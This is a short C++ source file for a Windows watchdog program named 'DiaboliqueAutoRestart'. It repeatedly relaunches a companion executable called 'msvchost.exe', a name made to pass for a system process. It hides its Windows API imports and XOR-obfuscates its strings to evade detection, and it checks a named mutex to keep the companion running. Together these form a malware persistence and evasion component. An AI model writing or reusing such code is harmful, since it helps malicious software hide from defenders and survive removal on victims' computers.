// DiaboliqueAutoRestart.cpp : Defines the entry point for the application.
//

#include "framework.h"
#include "DiaboliqueAutoRestart.h"

#include <WindowsImportHide.h>
#include <../XOR_STR.h>
#include <synchapi.h>

HANDLE g_Mutex = INVALID_HANDLE_VALUE;
bool GrabMutex()
{
    WINDOWS_IMPORT_HIDE(CreateMutexA, "kernel32.dll");
    WINDOWS_IMPORT_HIDE(GetLastError, "kernel32.dll");
    const char* szUniqueNamedMutex = XorStr("com_diabolique");
    g_Mutex = _CreateMutexA(NULL, TRUE, szUniqueNamedMutex);
    if (ERROR_ALREADY_EXISTS == _GetLastError())
    {
        return false; // Exit program
    }
    return true;
}

void UnGrabMutex()
{
    WINDOWS_IMPORT_HIDE(ReleaseMutex, "kernel32.dll");
    WINDOWS_IMPORT_HIDE(CloseHandle, "kernel32.dll");

    _ReleaseMutex(g_Mutex); // Explicitly release mutex
    _CloseHandle(g_Mutex); // close handle before terminating
}
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    WINDOWS_IMPORT_HIDE(Sleep, "Kernel32.dll");
    WINDOWS_IMPORT_HIDE(CreateProcessA, "Kernel32.dll");
    WINDOWS_IMPORT_HIDE(GetModuleFileNameA, "Kernel32.dll");
    WINDOWS_IMPORT_HIDE(WaitForSingleObject, "Kernel32.dll");
    WINDOWS_IMPORT_HIDE(CloseHandle, "kernel32.dll");




    while (true)
    {
        if (!GrabMutex())
        {
            _Sleep(10000);
            continue;
        }

        UnGrabMutex();

        STARTUPINFOA info = { sizeof(info) };
        PROCESS_INFORMATION processInfo;

        CHAR szExeName[_MAX_PATH], drive[_MAX_DRIVE], dir[_MAX_DIR], fname[_MAX_FNAME], ext[_MAX_EXT];
        _GetModuleFileNameA(hInstance, szExeName, _countof(szExeName));
        _splitpath_s(szExeName, drive, dir, fname, ext);
#pragma warning(disable : 4996)
        _makepath(szExeName, drive, dir, XorStr("msvchost"), XorStr(".exe"));
#pragma warning(restore : 4996)

        if (_CreateProcessA(szExeName, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo))
        {
            _WaitForSingleObject(processInfo.hProcess, INFINITE);
            _CloseHandle(processInfo.hProcess);
            _CloseHandle(processInfo.hThread);
        }

        _Sleep(10000);
    }


   
    return 0;
}

